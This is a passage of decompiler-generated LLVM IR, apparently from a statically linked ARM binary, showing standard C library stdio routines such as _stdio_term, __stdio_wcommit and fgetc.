  store i32 %v4_17f8c, i32* @r6, align 4
  %v1_17f90 = call i32 @isatty(i32 0)
  %v2_17f98 = icmp eq i32 %v1_17f90, 0
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r4, align 4
  br i1 %v2_17f98, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_17fa4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 308) to i16*), align 4
  %v7_17fa4 = zext i16 %v5_17fa4 to i32
  %v2_17fa8 = xor i32 %v7_17fa4, 256
  store i32 %v2_17fa8, i32* @r3, align 4
  %v2_17fac = trunc i32 %v2_17fa8 to i16
  store i16 %v2_17fac, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_17fb4 = call i32 @isatty(i32 1)
  %v2_17fb8 = icmp eq i32 %v1_17fb4, 0
  br i1 %v2_17fb8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_17fc0 = load i32, i32* @r4, align 4
  %v2_17fc4 = add i32 %v1_17fc0, 376
  %v3_17fc4 = inttoptr i32 %v2_17fc4 to i16*
  %v4_17fc4 = load i16, i16* %v3_17fc4, align 2
  %v2_17fc8 = xor i16 %v4_17fc4, 256
  store i16 %v2_17fc8, i16* %v3_17fc4, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_17fd4 = load i16, i16* @global_var_2447c.761, align 2
  %v4_17fd4 = sext i16 %v3_17fd4 to i32
  %v0_17fd8 = load i32, i32* @r6, align 4
  %v1_17fd8 = load i32, i32* @r5, align 4
  %v3_17fd8 = add i32 %v1_17fd8, %v4_17fd4
  %v4_17fd8 = inttoptr i32 %v3_17fd8 to i32*
  store i32 %v0_17fd8, i32* %v4_17fd8, align 4
  ret i32 %v1_17fb4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17ff4 = load i32, i32* @r4, align 4
  store i32 %v3_17ff4, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_18008 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_18008, i32* %r0.global-to-local, align 4
  %v5_18008 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_18008, i32* %r1.global-to-local, align 4
  %v8_18008 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -33092) to i32*), align 4
  %v2_18010 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_18010, i32* %r3.global-to-local, align 4
  store i32 %v2_18008, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1801c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 152) to i32*), align 4
  store i32 %v2_18008, i32* %r0.global-to-local, align 4
  store i32 %v5_18008, i32* %r1.global-to-local, align 4
  store i32 %v8_18008, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_1802c = inttoptr i32 %v4_1801c to i32*
  store i32 %v2_18008, i32* %v1_1802c, align 4
  %v3_1802c = add i32 %v4_1801c, 4
  %v4_1802c = inttoptr i32 %v3_1802c to i32*
  %v5_1802c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1802c, i32* %v4_1802c, align 4
  %v6_1802c = add i32 %v4_1801c, 8
  %v7_1802c = inttoptr i32 %v6_1802c to i32*
  %v8_1802c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1802c, i32* %v7_1802c, align 4
  %v0_18030 = load i32, i32* %r3.global-to-local, align 4
  %v1_18030 = inttoptr i32 %v0_18030 to i32*
  %v2_18030 = load i32, i32* %v1_18030, align 4
  store i32 %v2_18030, i32* %r0.global-to-local, align 4
  %v3_18030 = add i32 %v0_18030, 4
  %v4_18030 = inttoptr i32 %v3_18030 to i32*
  %v5_18030 = load i32, i32* %v4_18030, align 4
  store i32 %v5_18030, i32* %r1.global-to-local, align 4
  %v6_18030 = add i32 %v0_18030, 8
  %v7_18030 = inttoptr i32 %v6_18030 to i32*
  %v8_18030 = load i32, i32* %v7_18030, align 4
  %v2_18034 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_18034, i32* %r3.global-to-local, align 4
  store i32 %v2_18030, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_18040 = load i32, i32* %r7.global-to-local, align 4
  %v2_18040 = add i32 %v0_18040, 76
  %v3_18040 = inttoptr i32 %v2_18040 to i32*
  %v4_18040 = load i32, i32* %v3_18040, align 4
  store i32 %v4_18040, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_18048 = inttoptr i32 %v4_18040 to i32*
  %v2_18048 = load i32, i32* %v1_18048, align 4
  store i32 %v2_18048, i32* %r5.global-to-local, align 4
  %v2_1804c = add i32 %v0_18040, 160
  %v3_1804c = inttoptr i32 %v2_1804c to i32*
  %v4_1804c = load i32, i32* %v3_1804c, align 4
  store i32 %v2_18030, i32* %r0.global-to-local, align 4
  store i32 %v5_18030, i32* %r1.global-to-local, align 4
  store i32 %v8_18030, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_1805c = add i32 %v0_18040, -33124
  store i32 %v2_1805c, i32* %sl.global-to-local, align 4
  %v1_18060 = inttoptr i32 %v4_1804c to i32*
  store i32 %v2_18030, i32* %v1_18060, align 4
  %v3_18060 = add i32 %v4_1804c, 4
  %v4_18060 = inttoptr i32 %v3_18060 to i32*
  %v5_18060 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_18060, i32* %v4_18060, align 4
  %v6_18060 = add i32 %v4_1804c, 8
  %v7_18060 = inttoptr i32 %v6_18060 to i32*
  %v8_18060 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_18060, i32* %v7_18060, align 4
  %v0_180f0.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_180f016 = icmp eq i32 %v0_180f0.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_180f818 = add i32 %v0_180f0.pr, 56
  store i32 %v1_180f818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_180f016, label %dec_label_pc_18104, label %dec_label_pc_18068

dec_label_pc_18068:                               ; preds = %entry, %.thread10
  %v0_18068 = phi i32 [ %v3_180ec, %.thread10 ], [ %v0_180f0.pr, %entry ]
  %v1_18068 = add i32 %v0_18068, 64
  %v2_18068 = inttoptr i32 %v1_18068 to i32*
  %v3_18068 = load i32, i32* %v2_18068, align 4
  store i32 %v3_18068, i32* %r3.global-to-local, align 4
  %v0_1806c = call i32 @__aeabi_read_tp()
  store i32 %v0_1806c, i32* %r0.global-to-local, align 4
  %v1_18070 = add i32 %v0_1806c, -1168
  store i32 %v1_18070, i32* %r6.global-to-local, align 4
  %v3_18074 = icmp uge i32 %v3_18068, %v1_18070
  store i1 %v3_18074, i1* %cpsr_c.global-to-local, align 1
  %v9_18074 = icmp eq i32 %v3_18068, %v1_18070
  br i1 %v9_18074, label %.thread1, label %dec_label_pc_18088

.thread1:                                         ; preds = %dec_label_pc_18068
  %v1_18078 = load i32, i32* %r5.global-to-local, align 4
  %v2_18078 = add i32 %v1_18078, 60
  %v3_18078 = inttoptr i32 %v2_18078 to i32*
  %v4_18078 = load i32, i32* %v3_18078, align 4
  %v2_1807c = add i32 %v4_18078, 1
  store i32 %v2_1807c, i32* %r3.global-to-local, align 4
  store i32 %v2_1807c, i32* %v3_18078, align 4
  br label %.thread10

dec_label_pc_18088:                               ; preds = %dec_label_pc_18068, %dec_label_pc_18094
  %v0_18088 = load i32, i32* %r2.global-to-local, align 4
  %v1_18088 = inttoptr i32 %v0_18088 to i32*
  %v2_18088 = load i32, i32* %v1_18088, align 4
  store i32 %v2_18088, i32* %r3.global-to-local, align 4
  %v1_1808c = load i32, i32* %r4.global-to-local, align 4
  %v3_1808c = icmp uge i32 %v2_18088, %v1_1808c
  store i1 %v3_1808c, i1* %cpsr_c.global-to-local, align 1
  %v9_1808c = icmp eq i32 %v2_18088, %v1_1808c
  br i1 %v9_1808c, label %dec_label_pc_18094, label %dec_label_pc_180ac

dec_label_pc_18094:                               ; preds = %dec_label_pc_18088
  store i32 %v2_18088, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_180a4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_180a4, label %dec_label_pc_180a8, label %dec_label_pc_18088

dec_label_pc_180a8:                               ; preds = %dec_label_pc_18094
  %v0_180a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_180a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_180ac

dec_label_pc_180ac:                               ; preds = %dec_label_pc_18088, %dec_label_pc_180a8
  %v0_180ac = phi i32 [ %v0_180a8, %dec_label_pc_180a8 ], [ %v2_18088, %dec_label_pc_18088 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_180ac = icmp eq i32 %v0_180ac, 0
  %v2_180b8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_180ac, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_180ac
  %v1_180b8 = load i32, i32* %r6.global-to-local, align 4
  %v3_180b8 = add i32 %v2_180b8.pre, 64
  %v4_180b8 = inttoptr i32 %v3_180b8 to i32*
  store i32 %v1_180b8, i32* %v4_180b8, align 4
  %v1_180bc = load i32, i32* %r1.global-to-local, align 4
  %v2_180bc = load i32, i32* %r5.global-to-local, align 4
  %v3_180bc = add i32 %v2_180bc, 60
  %v4_180bc = inttoptr i32 %v3_180bc to i32*
  store i32 %v1_180bc, i32* %v4_180bc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_180ac
  %v2_180b0 = add i32 %v2_180b8.pre, 8
  %v3_180b0 = inttoptr i32 %v2_180b0 to i32*
  %v4_180b0 = load i32, i32* %v3_180b0, align 4
  store i32 %v4_180b0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_180c0 = add i32 %v2_180b8.pre, 20
  %v4_180c0 = inttoptr i32 %v3_180c0 to i32*
  store i32 %v4_180b0, i32* %v4_180c0, align 4
  %v1_180c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_180c4 = trunc i32 %v1_180c4 to i16
  %v3_180c4 = load i32, i32* %r5.global-to-local, align 4
  %v4_180c4 = inttoptr i32 %v3_180c4 to i16*
  store i16 %v2_180c4, i16* %v4_180c4, align 2
  %v1_180c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_180c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_180c8 = add i32 %v2_180c8, 24
  %v4_180c8 = inttoptr i32 %v3_180c8 to i32*
  store i32 %v1_180c8, i32* %v4_180c8, align 4
  %v1_180cc = load i32, i32* %r3.global-to-local, align 4
  %v2_180cc = load i32, i32* %r5.global-to-local, align 4
  %v3_180cc = add i32 %v2_180cc, 28
  %v4_180cc = inttoptr i32 %v3_180cc to i32*
  store i32 %v1_180cc, i32* %v4_180cc, align 4
  %v1_180d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_180d0 = load i32, i32* %r5.global-to-local, align 4
  %v3_180d0 = add i32 %v2_180d0, 16
  %v4_180d0 = inttoptr i32 %v3_180d0 to i32*
  store i32 %v1_180d0, i32* %v4_180d0, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_180d4 = load i32, i32* %sl.global-to-local, align 4
  %v1_180d4 = inttoptr i32 %v0_180d4 to i32*
  %v2_180d4 = load i32, i32* %v1_180d4, align 4
  store i32 %v2_180d4, i32* %r0.global-to-local, align 4
  %v3_180d4 = add i32 %v0_180d4, 4
  %v4_180d4 = inttoptr i32 %v3_180d4 to i32*
  %v5_180d4 = load i32, i32* %v4_180d4, align 4
  store i32 %v5_180d4, i32* %r1.global-to-local, align 4
  %v6_180d4 = add i32 %v0_180d4, 8
  %v7_180d4 = inttoptr i32 %v6_180d4 to i32*
  %v8_180d4 = load i32, i32* %v7_180d4, align 4
  store i32 %v8_180d4, i32* %r2.global-to-local, align 4
  %v1_180dc = load i32, i32* %r5.global-to-local, align 4
  %v2_180dc = add i32 %v1_180dc, 52
  %v3_180dc = inttoptr i32 %v2_180dc to i32*
  store i32 1, i32* %v3_180dc, align 4
  %v0_180e0 = load i32, i32* %r5.global-to-local, align 4
  %v1_180e0 = add i32 %v0_180e0, 56
  store i32 %v1_180e0, i32* %r3.global-to-local, align 4
  %v2_180e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_180e8 = inttoptr i32 %v1_180e0 to i32*
  store i32 %v2_180e4, i32* %v1_180e8, align 4
  %v3_180e8 = add i32 %v0_180e0, 60
  %v4_180e8 = inttoptr i32 %v3_180e8 to i32*
  %v5_180e8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_180e8, i32* %v4_180e8, align 4
  %v6_180e8 = add i32 %v0_180e0, 64
  %v7_180e8 = inttoptr i32 %v6_180e8 to i32*
  %v8_180e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_180e8, i32* %v7_180e8, align 4
  %v0_180ec = load i32, i32* %r5.global-to-local, align 4
  %v1_180ec = add i32 %v0_180ec, 32
  %v2_180ec = inttoptr i32 %v1_180ec to i32*
  %v3_180ec = load i32, i32* %v2_180ec, align 4
  store i32 %v3_180ec, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_180f0 = icmp eq i32 %v3_180ec, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_180f8 = add i32 %v3_180ec, 56
  store i32 %v1_180f8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_180f0, label %dec_label_pc_18104, label %dec_label_pc_18068

dec_label_pc_18104:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_18108 = load i32, i32* %r7.global-to-local, align 4
  %v2_18108 = add i32 %v0_18108, 76
  %v3_18108 = inttoptr i32 %v2_18108 to i32*
  %v4_18108 = load i32, i32* %v3_18108, align 4
  store i32 %v4_18108, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_18108 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1812814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1812814, label %dec_label_pc_18130, label %dec_label_pc_18114

dec_label_pc_18114:                               ; preds = %dec_label_pc_18104, %dec_label_pc_18128
  %v1_1811c = phi i32 [ %storemerge, %dec_label_pc_18128 ], [ %storemerge12, %dec_label_pc_18104 ]
  %v1_18114 = inttoptr i32 %v1_1811c to i16*
  %v2_18114 = load i16, i16* %v1_18114, align 2
  %v3_18114 = zext i16 %v2_18114 to i32
  store i32 %v3_18114, i32* %r3.global-to-local, align 4
  %v1_18118 = and i32 %v3_18114, 64
  %v2_18118 = icmp eq i32 %v1_18118, 0
  br i1 %v2_18118, label %dec_label_pc_18128, label %bb39

bb39:                                             ; preds = %dec_label_pc_18114
  store i32 %v1_1811c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18128

dec_label_pc_18128:                               ; preds = %dec_label_pc_18114, %bb39
  %v1_18120 = xor i1 %v2_18118, true
  call void @__pseudo_cond_branch(i1 %v1_18120, i32 ptrtoint (i32* @global_var_18158.1041 to i32))
  %v0_18124 = load i32, i32* %r4.global-to-local, align 4
  %v1_18124 = add i32 %v0_18124, 32
  %storemerge.in = inttoptr i32 %v1_18124 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18128 = icmp eq i32 %storemerge, 0
  br i1 %v2_18128, label %dec_label_pc_18130, label %dec_label_pc_18114

dec_label_pc_18130:                               ; preds = %dec_label_pc_18128, %dec_label_pc_18104
  %v2_18134 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_18134, i32* %r4.global-to-local, align 4
  %v1_18138 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18138

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_180ec, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1808c, { 1, 0 }
  uselistorder i32 %v4_1804c, { 2, 1, 0 }
  uselistorder i32 %v4_1801c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 4, 5, 6, 7, 8, 10, 1, 11, 9, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_18128, { 1, 0 }
  uselistorder label %dec_label_pc_18114, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_180ac, { 1, 0 }
  uselistorder label %dec_label_pc_18088, { 1, 0 }
  uselistorder label %dec_label_pc_18068, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18158 = load i32, i32* @r4, align 4
  store i32 %v3_18158, i32* %stack_var_-8, align 4
  %v1_1815c = add i32 %arg1, 8
  %v2_1815c = inttoptr i32 %v1_1815c to i32*
  %v3_1815c = load i32, i32* %v2_1815c, align 4
  store i32 %v3_1815c, i32* @r1, align 4
  %v1_18160 = add i32 %arg1, 16
  %v2_18160 = inttoptr i32 %v1_18160 to i32*
  %v3_18160 = load i32, i32* %v2_18160, align 4
  %v9_18164 = icmp eq i32 %v3_18160, %v3_1815c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_18164, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1815c, i32* %v2_18160, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_18170 = xor i1 %v9_18164, true
  call void @__pseudo_cond_branch(i1 %v1_18170, i32 ptrtoint (i32* @global_var_19b48.1042 to i32))
  %v0_18174 = load i32, i32* %r4.global-to-local, align 4
  %v1_18174 = add i32 %v0_18174, 8
  %v2_18174 = inttoptr i32 %v1_18174 to i32*
  %v3_18174 = load i32, i32* %v2_18174, align 4
  %v1_18178 = add i32 %v0_18174, 16
  %v2_18178 = inttoptr i32 %v1_18178 to i32*
  %v3_18178 = load i32, i32* %v2_18178, align 4
  %v2_1817c = sub i32 %v3_18178, %v3_18174
  %v2_18180 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18180, i32* @r4, align 4
  ret i32 %v2_1817c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_18188 = load i32, i32* @r4, align 4
  store i32 %v3_18188, i32* %stack_var_-20, align 4
  %v6_18188 = load i32, i32* @r5, align 4
  %v9_18188 = load i32, i32* @r6, align 4
  %v12_18188 = load i32, i32* @r7, align 4
  %v15_18188 = load i32, i32* @lr, align 4
  %v1_1818c = add i32 %arg1, 52
  %v2_1818c = inttoptr i32 %v1_1818c to i32*
  %v3_1818c = load i32, i32* %v2_1818c, align 4
  store i32 %v3_1818c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18190 = icmp eq i32 %v3_1818c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_18190, label %dec_label_pc_181c4, label %dec_label_pc_181a0

dec_label_pc_181a0:                               ; preds = %entry
  %v1_181a0 = add i32 %arg1, 16
  %v2_181a0 = inttoptr i32 %v1_181a0 to i32*
  %v3_181a0 = load i32, i32* %v2_181a0, align 4
  store i32 %v3_181a0, i32* %r2.global-to-local, align 4
  %v1_181a4 = add i32 %arg1, 24
  %v2_181a4 = inttoptr i32 %v1_181a4 to i32*
  %v3_181a4 = load i32, i32* %v2_181a4, align 4
  store i32 %v3_181a4, i32* %r3.global-to-local, align 4
  %v3_181a8 = icmp uge i32 %v3_181a0, %v3_181a4
  store i1 %v3_181a8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_181a8, label %dec_label_pc_181b8, label %.thread

.thread:                                          ; preds = %dec_label_pc_181a0
  %v2_181ac = inttoptr i32 %v3_181a0 to i8*
  %v3_181ac = load i8, i8* %v2_181ac, align 1
  %v4_181ac = zext i8 %v3_181ac to i32
  store i32 %v4_181ac, i32* %r5.global-to-local, align 4
  %v6_181ac = add i32 %v3_181a0, 1
  store i32 %v6_181ac, i32* %r2.global-to-local, align 4
  store i32 %v6_181ac, i32* %v2_181a0, align 4
  br label %dec_label_pc_182bc

dec_label_pc_181b8:                               ; preds = %dec_label_pc_181a0
  %v1_181b8 = inttoptr i32 %arg1 to i16*
  %v2_181b8 = call i32 @getc_unlocked(i16* %v1_181b8)
  store i32 %v2_181b8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_182bc

dec_label_pc_181c4:                               ; preds = %entry
  %v0_181c4 = call i32 @__aeabi_read_tp()
  %v0_181c8 = load i32, i32* @r7, align 4
  %v1_181c8 = add i32 %v0_181c8, 64
  %v2_181c8 = inttoptr i32 %v1_181c8 to i32*
  %v3_181c8 = load i32, i32* %v2_181c8, align 4
  store i32 %v3_181c8, i32* %r3.global-to-local, align 4
  %v1_181cc = add i32 %v0_181c4, -1168
  store i32 %v1_181cc, i32* @r6, align 4
  %v3_181d0 = icmp uge i32 %v3_181c8, %v1_181cc
  store i1 %v3_181d0, i1* %cpsr_c.global-to-local, align 1
  %v9_181d0 = icmp eq i32 %v3_181c8, %v1_181cc
  br i1 %v9_181d0, label %dec_label_pc_18218, label %dec_label_pc_181d8

dec_label_pc_181d8:                               ; preds = %dec_label_pc_181c4
  %v1_181d8 = add i32 %v0_181c8, 56
  store i32 %v1_181d8, i32* @r5, align 4
  store i32 %v1_181d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_181e4

dec_label_pc_181e4:                               ; preds = %dec_label_pc_181f0.dec_label_pc_181e4_crit_edge, %dec_label_pc_181d8
  %v0_181e4 = phi i32 [ %v0_181e4.pre, %dec_label_pc_181f0.dec_label_pc_181e4_crit_edge ], [ %v1_181d8, %dec_label_pc_181d8 ]
  %v1_181e4 = inttoptr i32 %v0_181e4 to i32*
  %v2_181e4 = load i32, i32* %v1_181e4, align 4
  store i32 %v2_181e4, i32* %r3.global-to-local, align 4
  %v1_181e8 = load i32, i32* @r4, align 4
  %v3_181e8 = icmp uge i32 %v2_181e4, %v1_181e8
  store i1 %v3_181e8, i1* %cpsr_c.global-to-local, align 1
  %v9_181e8 = icmp eq i32 %v2_181e4, %v1_181e8
  br i1 %v9_181e8, label %dec_label_pc_181f0, label %dec_label_pc_18208

dec_label_pc_181f0:                               ; preds = %dec_label_pc_181e4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18200 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18200, label %dec_label_pc_18204, label %dec_label_pc_181f0.dec_label_pc_181e4_crit_edge

dec_label_pc_181f0.dec_label_pc_181e4_crit_edge:  ; preds = %dec_label_pc_181f0
  %v0_181e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_181e4

dec_label_pc_18204:                               ; preds = %dec_label_pc_181f0
  %v0_18204 = load i32, i32* @r4, align 4
  store i32 %v0_18204, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18208

dec_label_pc_18208:                               ; preds = %dec_label_pc_181e4, %dec_label_pc_18204
  %v0_18208 = phi i32 [ %v0_18204, %dec_label_pc_18204 ], [ %v2_181e4, %dec_label_pc_181e4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18208 = icmp eq i32 %v0_18208, 0
  br i1 %v2_18208, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_18208
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_18208, %bb
  store i32 98836, i32* @lr, align 4
  %v1_18210 = xor i1 %v2_18208, true
  call void @__pseudo_cond_branch(i1 %v1_18210, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_18214 = load i32, i32* @r6, align 4
  %v1_18214 = load i32, i32* @r7, align 4
  %v2_18214 = add i32 %v1_18214, 64
  %v3_18214 = inttoptr i32 %v2_18214 to i32*
  store i32 %v0_18214, i32* %v3_18214, align 4
  %v0_18218.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18218

dec_label_pc_18218:                               ; preds = %dec_label_pc_181c4, %bb18
  %v1_18228 = phi i32 [ %v0_181c8, %dec_label_pc_181c4 ], [ %v0_18218.pre, %bb18 ]
  %v1_18218 = add i32 %v1_18228, 60
  %v2_18218 = inttoptr i32 %v1_18218 to i32*
  %v3_18218 = load i32, i32* %v2_18218, align 4
  store i32 %v3_18218, i32* %r2.global-to-local, align 4
  %v1_1821c = add i32 %v1_18228, 16
  %v2_1821c = inttoptr i32 %v1_1821c to i32*
  %v3_1821c = load i32, i32* %v2_1821c, align 4
  store i32 %v3_1821c, i32* @r1, align 4
  %v1_18220 = add i32 %v1_18228, 24
  %v2_18220 = inttoptr i32 %v1_18220 to i32*
  %v3_18220 = load i32, i32* %v2_18220, align 4
  store i32 %v3_18220, i32* %r3.global-to-local, align 4
  %v1_18224 = add i32 %v3_18218, 1
  store i32 %v1_18224, i32* %r2.global-to-local, align 4
  store i32 %v1_18224, i32* %v2_18218, align 4
  %v0_1822c = load i32, i32* @r1, align 4
  %v1_1822c = load i32, i32* %r3.global-to-local, align 4
  %v3_1822c = icmp uge i32 %v0_1822c, %v1_1822c
  store i1 %v3_1822c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1822c, label %dec_label_pc_1823c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18218
  %v2_18230 = inttoptr i32 %v0_1822c to i8*
  %v3_18230 = load i8, i8* %v2_18230, align 1
  %v4_18230 = zext i8 %v3_18230 to i32
  store i32 %v4_18230, i32* %r5.global-to-local, align 4
  %v6_18230 = add i32 %v0_1822c, 1
  store i32 %v6_18230, i32* @r1, align 4
  %v2_18234 = load i32, i32* @r7, align 4
  %v3_18234 = add i32 %v2_18234, 16
  %v4_18234 = inttoptr i32 %v3_18234 to i32*
  store i32 %v6_18230, i32* %v4_18234, align 4
  br label %dec_label_pc_18248

dec_label_pc_1823c:                               ; preds = %dec_label_pc_18218
  %v0_1823c = load i32, i32* @r7, align 4
  %v1_18240 = inttoptr i32 %v0_1823c to i16*
  %v2_18240 = call i32 @getc_unlocked(i16* %v1_18240)
  store i32 %v2_18240, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_18248

dec_label_pc_18248:                               ; preds = %.thread2, %dec_label_pc_1823c
  %v0_18248 = load i32, i32* @r7, align 4
  %v1_18248 = add i32 %v0_18248, 60
  %v2_18248 = inttoptr i32 %v1_18248 to i32*
  %v3_18248 = load i32, i32* %v2_18248, align 4
  %v1_1824c = add i32 %v3_18248, -1
  store i32 %v1_1824c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18250 = icmp eq i32 %v1_1824c, 0
  store i32 %v1_1824c, i32* %v2_18248, align 4
  br i1 %v2_18250, label %dec_label_pc_1825c, label %dec_label_pc_182bc

dec_label_pc_1825c:                               ; preds = %dec_label_pc_18248
  %v0_1825c = load i32, i32* %r3.global-to-local, align 4
